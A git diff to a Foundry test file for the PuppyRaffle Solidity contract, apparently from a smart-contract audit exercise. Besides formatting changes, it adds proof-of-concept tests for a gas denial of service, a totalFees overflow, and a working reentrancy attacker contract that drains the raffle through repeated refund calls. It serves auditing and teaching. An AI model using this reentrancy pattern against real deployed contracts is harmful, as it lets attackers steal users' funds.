@@ -16,11 +16,7 @@ contract PuppyRaffleTest is Test {
     uint256 duration = 1 days;
 
     function setUp() public {
-        puppyRaffle = new PuppyRaffle(
-            entranceFee,
-            feeAddress,
-            duration
-        );
+        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
     }
 
     //////////////////////
@@ -170,7 +166,7 @@ contract PuppyRaffleTest is Test {
         vm.warp(block.timestamp + duration + 1);
         vm.roll(block.number + 1);
 
-        uint256 expectedPayout = ((entranceFee * 4) * 80 / 100);
+        uint256 expectedPayout = (((entranceFee * 4) * 80) / 100);
 
         puppyRaffle.selectWinner();
         assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
@@ -188,8 +184,8 @@ contract PuppyRaffleTest is Test {
         vm.warp(block.timestamp + duration + 1);
         vm.roll(block.number + 1);
 
-        string memory expectedTokenUri =
-            "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";
+        string
+            memory expectedTokenUri = "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";
 
         puppyRaffle.selectWinner();
         assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
@@ -212,5 +208,178 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.selectWinner();
         puppyRaffle.withdrawFees();
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
+    }
+
+    //////////////////////
+    /// Audit Tests    ///
+    /////////////////////
+
+    //enterRaffle() tests//
+
+    // DOS Attack on gas price when entering the raffle too late
+    // Enter the raffle with XX players and check gas cost
+    function testCanBlewUpGasPriceWhenLookingForDuplicates() public {
+        vm.txGasPrice(1);
+        uint256 numberOfPlayers = 98; //1 to 100
+
+        address[] memory players = new address[](uint160(numberOfPlayers));
+        for (uint256 i; i < numberOfPlayers; i++) {
+            players[i] = address(i);
+        }
+        uint256 gasBefore = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
+        uint256 gasAfter = gasleft();
+        uint256 gasUsedFirst = (gasBefore - gasAfter) * tx.gasprice;
+        console.log(
+            "Gas used by the last player of the first array of %s players: %s",
+            numberOfPlayers,
+            gasUsedFirst
+        );
+
+        // Second salve of "x" number of players
+
+        address[] memory playersSecond = new address[](
+            uint160(numberOfPlayers)
+        );
+        for (uint256 i; i < numberOfPlayers; i++) {
+            playersSecond[i] = address(i + numberOfPlayers);
+        }
+        uint256 gasBeforeSecond = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee * players.length}(
+            playersSecond
+        );
+        uint256 gasAfterSecond = gasleft();
+
+        uint256 gasUsedSecond = (gasBeforeSecond - gasAfterSecond) *
+            tx.gasprice;
+
+        console.log(
+            "Gas used by the last player of the second array of %s players: %s",
+            players.length,
+            gasUsedSecond
+        );
+
+        assert(gasUsedFirst < gasUsedSecond);
+
+        // 143236 gas for 5 players
+        // 636724 gas for 20 players
+        // 2156305 gas for 50 players
+        // 6064707 gas for 98 players
+        // 17397671 gas for 196 players
+    }
+
+    function testEnterRaffleRequireCondition() public {
+        vm.txGasPrice(1);
+        uint256 gasBefore = gasleft();
+
+        address[] memory players = new address[](1);
+        players[0] = playerOne;
+        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
+        puppyRaffle.enterRaffle(players);
+
+        uint256 gasAfter = gasleft();
+        uint256 gasUsedFirst = (gasBefore - gasAfter) * tx.gasprice;
+
+        console.log("Gas used: %s", gasUsedFirst);
+        // Gas used: 8698 with require statement
+        // Needs an upgrade of libraries and pragma version for the error / revert statement test.
+    }
+
+    function testCanGetRefundReentrancy() public {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        console.log(
+            "The balance of the raffle contract before attack is: %s",
+            address(puppyRaffle).balance
+        );
+
+        // introduce attacker
+        AttackReentrant attackerContract = new AttackReentrant(puppyRaffle);
+        address attacker = makeAddr("attacker");
+        vm.deal(attacker, 10 ether);
+
+        uint256 attackerContractBalanceBefore = address(attackerContract)
+            .balance;
+
+        vm.prank(attacker);
+        attackerContract.attack{value: entranceFee}();
+
+        console.log(
+            "Attacker contract balance before the attack: %s",
+            attackerContractBalanceBefore
+        );
+        console.log(
+            "Attacker contract balance after the attack: %s",
+            address(attackerContract).balance
+        );
+
+        console.log(
+            "The balance of the raffle contract after attack is: %s",
+            address(puppyRaffle).balance
+        );
+    }
+
+    function testTotalFeesOverflow() public playersEntered {
+        // We finish a raffle of 4 to collect some fees
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        puppyRaffle.selectWinner();
+        uint256 startingTotalFees = puppyRaffle.totalFees();
+        // startingTotalFees = 800000000000000000
+
+        // We then have 89 players enter a new raffle
+        uint256 playersNum = 89;
+        address[] memory players = new address[](playersNum);
+        for (uint256 i = 0; i < playersNum; i++) {
+            players[i] = address(i);
+        }
+        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
+        // We end the raffle
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        // And here is where the issue occurs
+        // We will now have fewer fees even though we just finished a second raffle
+        puppyRaffle.selectWinner();
+
+        uint256 endingTotalFees = puppyRaffle.totalFees();
+        console.log("ending total fees", endingTotalFees);
+        assert(endingTotalFees < startingTotalFees);
+
+        // We are also unable to withdraw any fees because of the require check
+        vm.prank(puppyRaffle.feeAddress());
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        puppyRaffle.withdrawFees();
+    }
+}
+
+contract AttackReentrant {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackerIndex;
+
+    constructor(PuppyRaffle _puppyRaffle) {
+        puppyRaffle = _puppyRaffle;
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function attack() external payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    receive() external payable {
+        if (address(puppyRaffle).balance >= entranceFee) {
+            puppyRaffle.refund(attackerIndex);
+        }
     }
 }
